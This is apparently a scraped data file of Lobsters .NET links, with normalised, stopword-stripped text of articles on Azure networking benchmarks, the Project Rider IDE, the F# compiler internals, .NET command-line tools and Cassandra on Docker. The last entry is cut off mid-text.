516,Lobsters,dotnet,"C#, F#, .NET programming",Adventures in High Speed Networking on Azure,http://www.ageofascent.com/azure-cloud-high-speed-networking/,adventure high speed networking azure,serving million request per second gbps single azure vm age ascent million application message per second using core aspnet team smurf lab encouraging aspnet community standup found techempower benchmark test type plaintext simd net framework dual xeon ht core bounded latency receive side scaling wrk azure vm core techempower provide benchmark amazon w vcpus azure w core grand strategy mmo illyriad performance guaranteed virtual cpu forum discussion adventure high speed networking azure,serving million request per second gbps single azure vm illyriad game building new scale gaming age ascent ultrammo realtime twitch combat unprecedented scale also want instanton alwaysupdated experience rather waiting gigabyte downloads patch eschewing conventional wisdom high speed game client building javascript webgl rather cc directxopengl â tale another today talking server io throughput extreme end march held public scale test directpiloting concurrent rl player combat zone later ran automated load test throughput million application message per second using coresâ gave u substantially higher simulated player number however technology march looking revalidate assumption design choice little unconventional say least see thing today game server built like hft quant trading server also need dynamically scale repartition space fly based demand â dynamic scaling need good fit cloud pay use always capacity ready need whether burst sustained high throughput need prevailing wisdom would suggest need write server c use udp rather tcp run high spec bare metal box running linux already running client javascript ran tcp websockets wrote server code managed c ran window vm cloud madness aspnet team testing experimental server design smurf lab recently moved network quickly created http echo server based similar principle game server networking hoping validate whether inherent using managed c rather lower level closer metal language kindly agreed test initial feedback encouraging tweaking based feedback managed get single server performing peaking request per second whilst cpu showed weekly aspnet community standup video code shown video found extremely good performance would better base line compare luckily techempower benchmark looking two top performing server ulib cpollcppsp c linux really well however jumping conclusion caveat main one following rule test test type plaintext making change meet criterion test result follows connection pipeline depth bandwidth rps cpu mbps gbps gbps gbps gbps gbps gbps gbps gbps good coming close saturating nic additional change use simd available net framework hardware accelerated new ryujit compiler well result hopefully bring cpu network caveat testing full webserver although pas plain text requirement â however others full webservers certainly work per request â hand testing core xeon ht core whereas techempower benchmark running dual xeon ht core core play actual benchmark course numa node clock difference apply interesting direct comparison point think concluded window c good high performance networking possibly outperform best c linux far â deeper test reveal whether true translate cloud bearing mind max tcp throughput per connection bounded latency two vms connecting across datacenter perform worse two machine next directly connected via switch equally connecting east coast usa east coast usa higher bandwidth connection east coast usa europe ignoring terrible last mile connectivity wifi packet dropping reason interestingly west u east u east u europe first thing first make sure receive side scaling r switched virtual network adapter sure always default lower latency low bandwidth situation trying simd server window linux wrk load generator test earlier azure vm core give following network cpu window vm sending cpu good bandwidth even bare metal machine let alone vm plenty cpu thing looking linux measurement translates million request per second outperforming top gbe directly connected ht core peak test exceptional performance request every nano second micro second request millisecond likeforlike cloud comparison luckily techempower provide benchmark techempower benchmark server run amazon w vcpus look close enough azure w core azure vm slightly cheaper also slightly le ram get azure window vm make sure r switched using cpu respectable plenty cpu available â guessing bandwidth capped split vms base hardware fairly small affordable vm equate switching linux side get request per second come request per second looking chart exceptional performance latency avg stddev max flipping latency graph techempower test including top server throughput give result exactly sure interpret looking regular website regular current window net web stack inprogress refresh current grand strategy mmo illyriad go empty cache browser request europe east coast u back twice total distance mile though load balancer regular aspnet rather leaner newer aspnet azure cloud web page complete kb website faviconico ignored something wrong latency simple world response byte presumably vms datacenter prior applying recent learning testing shall obviously go bigger smaller cloud cheaper end basic vms feature standard counterpart believe basic cpu provisioned case outright shared cpu series preferred option faster cpu series memory local ssds core gb gb ssd disk bound d series series ability attach premium storage rdma attached ssd tb iop raid configuration w read use d series premium storage great hence testing however need exotic option hpc work want explicit cpu rather performance guaranteed virtual cpu use vms ghz vms additionally gbps infiniband network rdma technology fast interconnected cluster extreme server end core beast gb ram gb local ssd quick ootb test window azure virtual machine linux azure vm give result gbps cpu need multicore optimization looking linux wrk server request per second latency avg m stddev max however since cloud smaller machine give better scale inout granularity ymmv depending kind workload also production want give headroom burst rather trying max connection also kinder latency going continue testing setup variety configuration keep posted result far believe validates compromising performance running azure using window managed c get best performance also developer productivity takehome learning test far â doubt measure measure measure even think know performance generally lost unexpected place discus forum forum discussion adventure high speed networking azure
517,Lobsters,dotnet,"C#, F#, .NET programming",Project Rider – A C# IDE,http://blog.jetbrains.com/dotnet/2016/01/13/project-rider-a-csharp-ide/,project rider c ide,update update follow project rider twitter update subscribe take part project rider early access program ndc london crossplatform c ide project rider navigation editing postfix template inspection refactorings decompiler multiple runtime support build run debug cross platform work kotlin created c ide mean resharper licensing model jetbrains toolbox roadmap twitter jetbrainsrider,update ndc london organizer kindly uploaded recording project rider presentation enjoy update make sure follow project rider twitter receive update promptly update opened form subscribe take part project rider early access program everyone subscribes sending link project rider build soon ready today ndc london announced new project working little crossplatform c ide based intellij platform using resharper technology codename project rider ide includes lot functionality already familiar resharper intellijbased ide quick fix inspection smart navigation resharper hosted inside visual studio project rider full standalone ide still quite early following feature already available navigation smart navigation major feature jetbrains ides project rider different offering standard go type go file integrating intellij platform search everywhere feature go symbol type file even search setting action navigate popup menu also available giving access navigate basederived symbol class hierarchy find usage result displayed standard ide tool window editing wide range smart editing feature implemented typing assist inserting brace automatic formatting live template including resharper postfix template quick info tooltips gutter icon inheritance navigation context action inspection inspection supported resharper displayed error warning suggestion hint editor includes red code unresolved symbol underline highlight code issue altenter jetbrains ide would complete without altenter support menu item resharper quick fix context action available project rider also support applying bulk action whole file changing severity inspection directly menu refactorings limited set refactorings available refactorings require user interface kind implemented yet project rider rename symbol introduceinline variable well rewrite code response altenter inspection highlight decompiler try navigate type source decompile display c source would like look course standalone ide also brings many feature table multiple runtime support project rider support net framework mono coreclr support work load msbuild mono xbuild solution well dnx project also includes template creating new project create empty project really empty build run debug one important feature ide debugging project rider exception build run net framework mono dnx project debug net mono apps dnx debugging coreclr support coming build error displayed build tool window debug tool window used call stack variable watch window cross platform well running debugging multiple runtimes project rider run multiple platform run window mac o x linux mostly untested right work project rider standalone ide built intellij platform much like webstorm datagrip ides difference however instead reimplementing resharper feature intellij platform run jvm using resharper headless mode process communicating via fast custom binary protocol backend continues resharper written c running net mono frontend written kotlin talking intellij platform apis take indepth look implementation detail future blog post created c ide well kept asking u finally got around joke aside though main reason provide choice believe provide great user experience developer might interested using alternative environment believe right time due several factor working several year allowing resharper work different environment independently visual studio example dotpeek quite clear ever increasing tendency developer using nonwindows platform like give experience come know love resharper finally microsoft moving platform c language towards open source along initiative coreclr added incentive mean resharper resharper still number one extension visual studio one flagship product fact project rider using resharper reinforces commitment resharper update resharper mutually benefit resharper project rider also addition hoping work put project rider feed back resharper essence project rider increase effort put resharper licensing model early right comment specific detail licensing model inline product jetbrains toolbox take account many usage scenario might occur establishing pricing someone wanting use tool etc hope pricing information soon roadmap starting road confident architecture believe built good foundation implement feature want see release got lot functionality already implemented still got lot need build aiming open private eap coming week towards end february announce signup form blog well twitter soon private eap move public eap happen much depends feedback get early tester aim release sometime autumn excited project rider hope share excitement question please ask away forget follow jetbrainsrider update p course ndc london week pop booth happy show project rider action
518,Lobsters,dotnet,"C#, F#, .NET programming",F# Compiler Technical Overview,http://fsharp.github.io/2015/09/29/fsharp-compiler-guide.html,f compiler technical overview,f compiler technical overview editing submitting pullrequest add issue content introduction contributing f language compiler core library overview fsharpcompilerservice separate guide version related matter key data format representation compileoptionsfs parsfsy lexfsl lexhelpfs astfs tastfs tcstate compileopsfs typecheckerfs nameresolutionfs ilmoduledef ilfs ilreadfs ilwritefs tastpicklefs ilreflectfs incrementalbuildfsi incrementalbuildfs publicfacing fsharpcompilerservice api f compiler service operation queue f compiler service cache key compiler phase referenceresolutionfsi referenceresolutionfs importfsi importfs typecheckerfsi typecheckerfs patternmatchcompilationfsi patternmatchcompilationfs constraintsolverfsi constraintsolverfs postinferencechecksfsi postinferencechecksfs quotationtranslatorfsi f quotationpicklerfs f optimizerfsi optimizerfs innerlambdastotoplevelfuncsfsi f lowercallsandseqsfs compileoptionsfs ilxgenfsi ilxgenfs eraseclosuresfs eraseunionsfs ilwritefsi ilwritefs ilreflectfs coding standard idiom abbreviation error message userfacing text adding error message excellent introductory guide adding new error message formatting user text tast item note displaying type input size limitation type provider performance code optimization debug optimized assembly generated code disassembly window potential future optimization better inlining user voice request compiler startup performance compiler memory usage key scenario memory usage analyzing compiler memory usage compiler throughput performance compiler language service crossproject reference rawfsharpassemblydata lot computation eventuallybuilder f compiler service operation queue incrementalbuildfsi incrementalbuildfs f compiler service operation queue technical documentation operation queue f compiler service cache technical documentation cache bootstrapping microsoftvisualfsharp fsharpfsharp fsharpcompilerservice fsharpbuild microsoftcommontargets f handle embeddedresource item differently c detail tracking bug issue tracking bug issue tracking issue end note find want add issue u f software foundation website,f compiler technical overview please help improve guide editing submitting pullrequest specific topic would like see addressed guide please add issue content introduction guide discus f compiler source code implementation technical point view see also contributing f language compiler core library guide read conjunction include core code relationship described overview f compiler repository used produce range different artifact purpose guide important one fsharpcompilerservice nuget package dll shipped integrated component f editor scripting tool fscexe fsiexe fsharpcompilerdll core binary visual f tool window microsoft tool also include fsharplanguageservicecompilerdll special trimmeddown build core f compiler fsharpc fsharpi fscexe fsiexe fsharpcompilerdll core binary crossplatform open edition package f included linux package xamarin tooling f fsharpcoredll see separate guide version related matter covered guide except interaction f compiler core case distribution f include core f compiler key data format representation following key data format internal data representation f compiler code various configuration input source file read unicode text binary referenced assembly input command line argument see compileoptionsfs full code implementing argument table command line argument also accepted f compiler service api project specification optional input f interactive token see parsfsy lexfsl lexhelpfs related file abstract syntax tree ast see astfs untyped syntax tree resulting parsing typed abstract syntax tree tast see tastfs related file typed bound syntax tree including typemodule definition backing expression resulting type checking subject successive phase optimization representation change type checking contextstate see example tcstate compileopsfs constituent part particularly tcenv typecheckerfs nameresolutionenv nameresolutionfs set table representing available name assembly etc scope type checking plus associated information abstract il output code generation used binary generation input format reading net assembly see ilmoduledef ilfs net binary format added pickled f metadata resource final output fscexe see ecma specification ilreadfs ilwritefs binary readergenerator implementation added f metadata stored binary resource see tastpicklefs incrementally emitted net reflection assembly incremental output fsiexe see ilreflectfs incremental project build engine state incrementalbuildfsiincrementalbuildfs fsharpcompilerservice api note older version functionality persists internally microsoftvisualfsharp repository visual f tool corresponding apis wrapping accessing structure publicfacing fsharpcompilerservice api note older version functionality persists internally microsoftvisualfsharp repository visual f tool f compiler service operation queue covered compiler service documentation note older version functionality persists internally microsoftvisualfsharp repository visual f tool f compiler service cache covered compiler service documentation note older version functionality persists internally microsoftvisualfsharp repository visual f tool key compiler phase see diagram different phase f compiler work following key phase highlevel logical operation f compiler code various configuration basic lexing produce token stream input source file text whitespace sensitive lexing accepts produce token stream augmenting per f language specification parsing accepts token stream produce ast per grammar f language specification resolving reference see referenceresolutionfsireferenceresolutionfs accepts commandline argument produce information assembly reference us msbuild reference really used f interactive importing referenced net binary see importfsi importfs accepts file reference produce tast node referenced assembly including information type definition type forwarders importing referenced f binary optimization information tast data structure see picklefsfsi accepts binary data produce tast node referenced assembly including information typemodulefunctionmember definition sequentially type checking file see typecheckerfsi typecheckerfs accepts ast plus type checking contextstate produce new tast node incorporated updated type checking state plus additional tast expression node used code generation pattern match compilation see patternmatchcompilationfsipatternmatchcompilationfs accepts subset checked tast node representing f pattern matching produce tast expression implementing pattern matching called type checking construct involving pattern matching processed constraint solving see constraintsolverfsi constraintsolverfs constraint solver state maintained type checking single file constraint progressively asserted ie added state fresh inference variable generated variable eliminated solved variable also generalized various language construct explicitly declared making rigid called type checking construct processed postinference type check see postinferencechecksfsi postinferencechecksfs called end type checkinginference file range check enforced type checking file complete quotation translation see quotationtranslatorfsifsquotationpicklerfsfs generates stored information f quotation node generated tast expression structure f compiler quotation ultimately stored binary data plus added type reference reflecteddefinition quotation collected stored single blob optimization phase primarily optimize peepholeinlining top level representation lambda lifting phase see optimizerfsioptimizerfs innerlambdastotoplevelfuncsfsifs lowercallsandseqsfs take tast node type expression either modifies node place produce new tast node phase orchestrated compileoptionsfs code generation see ilxgenfsiilxgenfs accepts tast node produce abstract il node abstract il code rewriting see eraseclosuresfs eraseunionsfs eliminates construct rewriting abstract il node binary emit used f compiler fscexe see ilwritefsiilwritefs reflectionemit used f interactive fsiexe see ilreflectfs internal phase transformation used build following coding standard idiom abbreviation compiler codebase us various abbreviation necessarily good standard used abbreviation meaning ad accessor domain meaning permission accessing code access construct amap assembly map saying map il reference f ccus arg argument parameter argty argument parameter type arginfo argument parameter metadata ccu reference f compilation unit f dll possibly including dll compiled celem custom attribute element cenv compilation environment mean different thing different context usually parameter singlecompilation state object passed set related function single phase compilation state often mutable cpath compilation path meaning abc overall name containing type module definition cs constraint solver state denv display environment parameter guiding formatting type einfo info object event whether net event f event provided event e expression env environment mean different thing different context usually immutable state passed adjusted set related function single phase finfo info object field whether net field provided field fref reference ilfieldref abstract il node field reference would normally modernized ilfieldref g tcglobals value id identifier lid long identifier source code range marker mimpl il interface method implementation minfo info object method whet net method f method provided method modul tast structure namespace f module pat pattern syntactic ast node representing part pattern pattern match pinfo info object property whether net property f property provided property rfref record class field reference reference tast node record class field scoref scope reference il metadata either assembly netmodule local spat simple pattern syntactic ast node representing part pattern pattern match tau type forall node stripped ie node represent generic type parameter come notation 𝛕used type theory tcref type constructor reference entityref tinst type instantiation tpenv type parameter environment track type parameter scope type checking ty typ type usually tast type tys typs list type usually tast type typar type parameter tyvar type variable usually referring il type variable compiled form f type parameter ucref union case reference reference tast node union case vref value reference reference tast node value phase abbreviation meaning syn abstract syntax tree tc typechecker il abstract il f representation net il ilx extended abstract il net il plus coulpe contructs get erased error message userfacing text adding error message steffen forkmann written excellent introductory guide adding new error message formatting user text tast item formatting tast object tyconrefs text normally use either function niceprint module niceprintoutputtyconref take displayenv record context type referenced eg open namespaces opened namespaces shown displayed output displayname property relevant object drop n text net add compiled name type us f facing name type rather compiled name type eg name given compiledname attribute function tastopsfulltextoftyconref used show full qualified name item formatting info object see function niceprint module note displaying type displaying type normally want prettify type first ie make type pretty convert remaining type inference variable new better userfriendly type variable name like various function prettify type prior display eg niceprintlayoutprettifiedtypes others displaying multiple type comparative way eg two type match want display minimal amount infomation convey fact two type different eg niceprintminimalstringsoftwotypes displaying type option displaying constraint implied type variable mentioned type appended example niceprintlayoutprettifiedtypeandconstraints input size limitation f compiler must accept large input large array expression large list expression long list sequential expression long list let let long sequence else expression long sequence match x expression combination general problem input size accepted various dimension determined partly available process stack devenvexe fscexe fsiexe fsianycpuexe process input size limitation precisely specified test precise number fail number instead historically able remove limit encountered moving stack heap certain operation eg collecting free variable long chain let standard continuation coding technique compiler many dimension expansion large expression simply occur example get lambda nested deep might get deep however case example large expression occur practice aside array expression called linear expression single linear hole shape expression eg precise linear hole expr hole list expression rightlinear construction expr hole sequential expression let v expr hole let expression expr expr else hole conditional expression match expr pat v v hole eg match expr x none note application expression actually list processing naive way often us unbounded stack instead processed using continuation place stack frame heap example remapexpr operation becomes two function remapexpr nonlinear case remaplinearexpr linear case latter tailcalls construct hole position mentioned passing result continuation remaplinearexpr g compgen tmenv expr contf match expr exprlet bind bodyexpr tailcall linear position remaplinearexpr g compgen tmenvinner bodyexpr contf fun bodyexpr exprsequential dir spseq tailcall linear position remaplinearexpr g compgen tmenv contf fun linearmatchexpr spbind exprm dtree ty tailcall linear position remaplinearexpr g compgen tmenv contf fun linearopexpr op tyargs argsfront arglast tailcall linear position remaplinearexpr g compgen tmenv arglast contf fun arglast contf remapexpr g compgen tmenv e remapexpr g tcglobals compgen valcopyflag tmenv remap expr match expr linearopexpr linearmatchexpr exprsequential exprlet remaplinearexpr g compgen tmenv expr fun x x note telltale use contf continuation function processing body expression e letexpression tailrecursive next construct also letexpression processing expression sequentialexpression tailrecursive processing second expression con tailrecursive code may considered incomplete arbitrary combination let sequential expression going dealt tailrecursive way generally try combination well type provider fsharptypeprovidersdk project canonical home information type provider performance code optimization optimization performed optimizerfs detuplefs innerlambdastotoplevelfuncsfs lowercallsandseqsfs optimization optimizerfs propagation known value constant x lambda tuplesrecordsunioncases known value inlining known lambda value eliminating unused binding eliminating sequential code sideeffect eliminating switch determine definite success failure pattern matching eliminating getting field immutable recordtupleunioncase known value expand tuple binding let v avoid allocation used first class value propogating cutting big function multiple method especially match case avoid massive method take long time jit removing tailcalls determined code transitive closure tailcall recurses debug optimized assembly generated code look optimized assembly generated jit visual studio go debug debugging general uncheck enable code suppress jit optimization module load managed set breakpoint code open disassembly window start debugging normal optimized code difficult step breakpoint may never hit despite line executed line reliably map generated code may need rearrange code put breakpoint somewhere else example put breakpoint calling function mark function want inspect inline code inlined calling function potential future optimization better inlining user voice request would great compiler inline away cps composition like following let inline f k fun x k x let inline g k fun x k x f g id thread includes insightful comment problem described one link jack linked actually basic op first order function passed argument second order function inlined even second first order function marked inline make using second order function always come performance penalty case first order function compiler startup performance compiler startup performance key factor affecting happiness f user compiler took start far fewer people would use f platform following factor affect startup performance time load compiler binary depends size generated binary whether precompiled eg using ngen way net implementation load time open referenced assembly eg mscorlibdll fsharpcoredll analyze type namespaces defined depends particularly whether correctly done ondemand way time process open declaration top file processing declaration observed take time case f compilation factor specific specific file compiled window compiler startup performance tends greatly improved use ngen ngen run fscexe fsiexe installation visual f tool monolinuxosx compiler startup performance le good bad improvement achieved using aot mono equivalent ngen note building tool using fsharpcompilerservice nuget package ngen automatically run dll startup time tool building may degraded possible arrange ngen run tool installed compiler memory usage overall memory usage primary determinant usability f compiler instance f compiler service overly high memory usage result poor throughput particularly due increased gc time low user interface responsivity tool visual studio editing environment key scenario memory usage overall memory usage depends considerably scenario phase configuration key scenario overall memory usage instance visual studio another editing environment editing f project overall memory usage visual f power tool visual studio editing refactoring f project memory usage throughput f compiler fscexe memory usage throughput f interactive dynamic scripting compiler fsiexe analyzing memory usage f compiler instance f compiler service done using tool visual studio managed memory analysis example analyzing compiler memory usage analyze memory usage visual f tool visual studio without visual f power tool take process minidump devenvexe process task manager open dmp file another instance visual studio click debug managed memory also compare baseline generated without using visual f tool bucket memory usage type let analyze root keeping object alive time writing top type consuming managed memory follows percentage approximate depend scenario case bucketed type approx category cause memchannel tast absil inmemory representation referenced dlls system dlls read using memorymapped file bytefile others valdata tast pervalue data one object f value declared imported optimization expression others entitydata tast various type pertypeormoduleornamespacedefinition data f type declared f net type imported tyconaugmentation publicpath lazy moduleornamespacetype func moduleornamespacetype others iltypedefs iltypedef tastabsil various type delayed thunk reading il type definition net assembly tuple ilscoperef ilattributes lazy iltypedef lazy tuple ilscoperef ilattributes lazy iltypedef func tuple ilscoperef ilattributes lazy iltypedef importlazymoduleornamespacetypefornestedtypes others mapnode string item tastnameresolution editor incremental tcstate name resolution environment stored various open file intermediate file point active visual studio sesson mapnode string entityref capturednameresolution nameresolutionenv others lazy fsharplist ilattribute tastabsil various type delayed thunk reading list attribute net assembly ilbinaryreaderseekreadcustomattrs func fsharplist ilattribute attrib others dictionary string tastabsil various table including used reading binary dictionary string string tastabsil memoization table string entityref tast node representing reference entity pointing entitydata nonlocalentityref others synexprapp ast node untyped syntax tree kept editor environment others ilmethoddefs ilmethoddef tastabsil various type reading il methode definition net assembly others ident tast identifier range reference string ttypefun tast node function type especially imported metadata ttypeapp tast node constructed type like list int fsharplist ttype tast list type usually tuple type application typardata tast data type inference variable generic parameter vallinkagepartialkey tast data indicating one assembly reference valuemethodmember another iltyperef tastabsil type reference abstractil metadata xmldoc ast documentation string long tail type probably belong general category increasing total looking analysis conclusion time writing considerable chunk memory used inmemory copy referenced dlls practice difficult avoid similar memory also used even using memorymapped dlls nearly longlived memory related tast node f compiler data structure related abstract il node net assembly imported abstract il data structure delayedreading net type definition use memory inefficiently abstract il data structure delayedreading net attribute use memory relatively inefficiently considerable long tail memory usage categorized type alternative way look data f type used inefficiently longstored object example f core type approx fsharplist fsharpoption tuple fsharpmap fsharpset negligible micro saving available hunt carefully compiler throughput performance tbd discus topic related compiler performance including phase cost data structure gc setting etc compiler language service crossproject reference compiler generally built compile one assembly assumption compiling one assembly baked several aspect design tast contract fcs support compiling graph project different assembly tast node shared different project compilation ilmodulereader shared artificially extending lifetime via cache work rawfsharpassemblydata data blob would normally stuffed f resource generated dll normal compilation output checking project used input assembly reference consuming project instead ondisk dll within consuming project blob resurrected tast node via tastpicklefs could share thing idea share node either lifetime point view correctness point view correctness process generating blob tastpickle pxyz resurrecting tastpickle u transformation tast necessary correctness compilation eg http githubcommicrosoftvisualfsharpblobmastersrcfsharptastpicklefs basically tast node compilation one assembly valid compiling different assembly indeed much worse tast node include ccudata node access number callback tcimports compilation context assembly compiled eg http githubcommicrosoftvisualfsharpblobmastersrcfsharptastfs tast node tied particular compilation particular assembly think way share result without lot hard work digging assumption note pretty much tast node assembly compilation tied together graph lifetime tast node tied together graph sharing one two might drag across entire graph extend lifetime graph risky reiterate compiler built compile assembly assumption compiling one assembly baked several aspect design tast eventually computation part f codebase specifically type checker written using eventually computation expression see eventuallybuilder define resumptionlike computation timesliced suspended discarded bind point done ensure longrunning typechecking computation f compiler service interrupted cancelled documentation f compiler service operation queue cover aspect clarify fsiexe f interactive fscexe use time sliced computation force eventually computation synchronously without interruption instance f compiler service use time slicing two thing lowpriority computation reactor thread ie background typechecking incremental builder typechecking phase typecheckonefile highpriority computation reactor thread first interrupted incremental builder dependency graph see incrementalbuildfsiincrementalbuildfs decide bother continuing computation drop floor second interrupted via isresultobsolete f compiler service api return true f compiler service operation queue f compiler service technical documentation operation queue used fsharpchecker component f compiler service cache f compiler service technical documentation cache used fsharpchecker component bootstrapping microsoftvisualfsharp fsharpfsharp repository bootstrapped existing f compiler used build proto compiler current source code proto compiler used compile producing final compiler ensures final compiler compiled relevant optimization fix fsharpcompilerservice component bootstrapped simply compiled existing f compiler produce net component practice sufficient given overall stability codebases fsharpbuild fsharpbuilddll microsoftfsharptargets give xbuildmsbuild support f project fsproj although strictly part f compiler component always found f tool distribution mono window also mono xbuild target file microsoftcommontargets process embeddedresource item differently msbuild lead difference thing work best test project understanding going resource name includes various embeddedresource item custom fssrgen item give rise resource f handle embeddedresource item differently c detail f differs subtly c embeddedresource item fsproj file handled embeddedresource specification minus fssrgen one used c project get roughly command line argument resource objdebugresxresourceresources resource objdebugresxresourcewithlogicalnameresources theexplicitnameofresxresourcewithlogicalname resource objdebugsubdirresxresourceinsubdirresources resource objdebugsubdirresxresourcewithlogicalnameinsubdirresources theexplicitnameofresxresourcewithlogicalnameinsubdir resource nonresxresourcewithlogicalnametxt theexplicitnameofnonresxresourcewithlogicalname resource nonresxresourcetxt nonresxresourcetxt resource subdirnonresxresourceinsubdirtxt subdirnonresxresourceinsubdirtxt resource subdirnonresxresourcewithlogicalnameinsubdirtxt theexplicitnameofnonresxresourcewithlogicalnameinsubdir give net binary resource name mresource public resxresourceresources mresource public theexplicitnameofresxresourcewithlogicalname mresource public subdirresxresourceinsubdirresources mresource public theexplicitnameofresxresourcewithlogicalnameinsubdir mresource public theexplicitnameofnonresxresourcewithlogicalname mresource public nonresxresourcetxt mresource public subdirnonresxresourceinsubdirtxt mresource public theexplicitnameofnonresxresourcewithlogicalnameinsubdir f window using msbuild get command line argument resource objdebugresxresourceresources resource objdebugresxresourcewithlogicalnameresources resource objdebugsubdirresxresourceinsubdirresources resource objdebugsubdirresxresourcewithlogicalnameinsubdirresources resource nonresxresourcewithlogicalnametxt resource nonresxresourcetxt resource subdirnonresxresourceinsubdirtxt resource subdirnonresxresourcewithlogicalnameinsubdirtxt resource objdebugfscompresources give net binary resource name mresource public resxresourceresources mresource public resxresourcewithlogicalnameresources mresource public subdirresxresourceinsubdirresources mresource public subdirresxresourcewithlogicalnameinsubdirresources mresource public nonresxresourcewithlogicalnametxt mresource public nonresxresourcetxt mresource public nonresxresourceinsubdirtxt mresource public nonresxresourcewithlogicalnameinsubdirtxt mresource public fscompresources f linuxosx using mono xbuild get resource objdebugresxresourceresources resource objdebugresxresourcewithlogicalnameresources resource objdebugresxresourceinsubdirresources resource objdebugresxresourcewithlogicalnameinsubdirresources resource objdebugfscompresources resource objdebugfscomplinkedinsuperdirresources resource objdebugfscomplinkedinsamedirresources resource objdebugfscomplinkedinsubdirresources resource objdebugnonresxresourcewithlogicalnametxt resource objdebugnonresxresourcetxt resource objdebugnonresxresourceinsubdirtxt resource objdebugnonresxresourcewithlogicalnameinsubdirtxt give net binary resource name mresource public resxresourceresources mresource public resxresourcewithlogicalnameresources mresource public resxresourceinsubdirresources mresource public resxresourcewithlogicalnameinsubdirresources mresource public fscompresources mresource public fscomplinkedinsuperdirresources mresource public fscomplinkedinsamedirresources mresource public fscomplinkedinsubdirresources mresource public nonresxresourcewithlogicalnametxt mresource public nonresxresourcetxt mresource public nonresxresourceinsubdirtxt mresource public nonresxresourcewithlogicalnameinsubdirtxt note c f window resx resource subdirectory subdir prefixed correct c also add default namespace rootnamespace property set default f project removed c project f window nonresx resource subdirectory subdir prefixed deviate c tracking bug issue unlikely change point would breaking change ideally changed f linux resource missing subdirectory name case tracking bug issue mresource public subdirresxresourceinsubdirresources v mresource public resxresourceinsubdirresources f explicit logicalname property seems ignored even window tracking issue end note find want please add issue outlining technical information looking u f core engineering group working group associated f software foundation visit website please continue great work core f engineering first published september f core engineering group
519,Lobsters,dotnet,"C#, F#, .NET programming",.NET Developers – Love Thy Command Line,http://developer.telerik.com/featured/net-developers-love-thy-command-line/,net developer love thy command line,new net command line reinvented modern developer dnvm dnvm installed purpose purpose parameter purpose purpose parameter purpose parameter purpose parameter purpose parameter purpose parameter purpose parameter purpose dnu dnu purpose purpose purpose parameter purpose purpose dnx dnx purpose purpose purpose dotnet cli net cli conclusion telerik devcraft,last decade window net developer using visual studio shielded command line need command line tool everything needed app development right visual studio simply use extensive ide menu option rightclick access additional operation context menu result command line tooling often thought counter productive meant über geek rich ides making developer lazy depend ui perform even simplest task keep hearing people boast power flexibility command line feature invoke ide relax command line nt difficult use little practice master art lot power disposal new net lean modular crossplatform much lower barrier entry since developer choose ide o choice commonality window osx linux becomes command line command line tooling net work way platform article distills common useful command line tooling new net dispense cat picture funny meme focus creating straight developer cheat sheet net command line tooling deeper look cli tool net cli check whitepaper command line reinvented modern developer celebrates resurgence cli tool provides insight modern development platform cater application development web desktop mobile channel dnvm since net portable need comprehensive version manager manage apps using bundling net framework job dnvm net version manager dnvm work crossplatform installed come set command line tool list commonly used command along flag parameter offer flexibility developer dnvm purpose check dnvm installed print version dnvm list purpose list dnx version information parameter detailed display detailed info runtime dnvm help purpose look help information commandsparameters dnvm install purpose installs requested dnx version parameter version specified dnx version latest grab latest dnx feed o operating system target runtime darwin osx runtime target architecture default p set installed version default persistent f force install dnx version top existing one u grab dnx version unstable feed r runtime indicator mono coreclr g install dnx configured global dnx file location alias set alias requested dnx version install assume yes prompt dnvm upgrade purpose installs latest dnx feed set default one step parameter f force upgrade overwriting existing dnx version u grab dnx version unstable feed r runtime indicator mono coreclr g install dnx configured global dnx file location assume yes prompt dnvm uninstall purpose uninstalls requested dnx version parameter version specified dnx version o operating system target runtime darwin osx runtime target architecture default r runtime indicator mono coreclr assume yes prompt dnvm use purpose set requested dnx version host apps parameter version add dnx bin path current command line session none remove dnx bin path current command line session p set specified version dnx default persistent r runtime indicator mono coreclr runtime target architecture default dnvm run purpose bootstrap dnx run requested version without affecting current path parameter version specified dnx version run args argument passed dnx dnvm alias purpose list alias set alias requested dnx version parameter none list dnx alias defined alias name alias set version dnx version set alias remove specified alias dnvm updateself purpose update dnvm dnu dnvm set net runtimes start building app invariably dependency could part net framework want pull nuget third party open source package want consume need command line tool help manage dependency enter dnu dnu stand dotnet utility provides command line tooling used manage restore pack publish apps along package dependency common command may using inside app project directory dnu restore purpose restores nuget package project per reference projectjson dnu build purpose produce assembly project given directory dnu publish purpose package app requested dnx runtime deployment parameter projectpath root directory app publish outputpath output directory published app configuration releasedebug package mode publish app runtime version specified dnx include app package dnu pack purpose build nuget package project given directory dnu list purpose list dependency given appproject dnx built app top right net runtime managed package dnu time run app dnx come dnx net executable runtime host app bootstrap entry point net application also use dnx fire command either builtin custom one app shown command dnx webkestrel purpose start aspnet dnx host windowsosxlinux dnx command purpose invoke named execution custom net entry point defined projectjson dnx run purpose run console app top dnx dotnet cli getting comfortable dnvm dnu tooling stop forget command article listed well reality syntactical part let discus net cli part trying make net command line accessible consistent new set tool work aptly called dotnet cli set command slated replace much dnu tooling saw us general idea invoked via standard dotnet moniker net cli supposed go live along side aspnet slated sometime new command net cli listed exactly thing dnu tooling counterpart allow start mapping transition dotnet new creates new project dotnet run dotnet compile compiles il native compiles native dotnet pack dotnet restore dotnet publish conclusion hopefully command cheat sheet article help get better grasp various command along flagsparameters disposal fear bravely step world command line tool net find power addictive flexibility indispensible need polished ui apps start free trial telerik devcraft complete net toolset web desktop mobile development sure enough net command line tool work alongside apps go build next big thing
520,Lobsters,dotnet,"C#, F#, .NET programming",About Cassandra on Docker with F#,https://lenadroid.github.io/posts/cassandra-docker-fsharp.html,cassandra docker f,cassandra good batch bad batch docker connecting cassandra docker f cassandra link,blog post show set cassandra cluster docker use f connect execute type application specific operation query using mac docker toolbox installed osx f code example using f projectscaffold template paket xamarin studio o x cassandra first cassandra pretty interesting powerful distributed database come relational database background thoroughly explore system using even though cql language used cassandra performing query quite similar sql first glance approach create manage table really different benefit using cassandra noticeable need low latency service huge easily scaled data storage nt mean use cassandra project require low latency big data scalability one solution able provide characteristic build fast big data application advice explore available option ie cassandra riak hbase etc compare result application design performance point view always easy way build reliable system going back cassandra store data approach based column family need well understood making decision use cassandra relational database goal primary key provide uniqueness cassandra primary key serf two purpose uniqueness satisfaction table query therefore data modeling process differs one using relational world working rdbms create table entity manytomany relationship following rule normalization save space normalizing data model query data perform lot join expensive resulting fact latency suck problem rdbms also known issue complexity scalability data becomes really big working data always tradeoff relational system tradeoff low latency ease scalability saving disk space providing consistent transaction cassandra get low latency decent scalability utilize disk space data storage approach right wrong choose critical fast response scalability disk space transaction cassandra full control consistency level tune value query mean read writes happen query safer take longer cassandra data modeling approach repelled 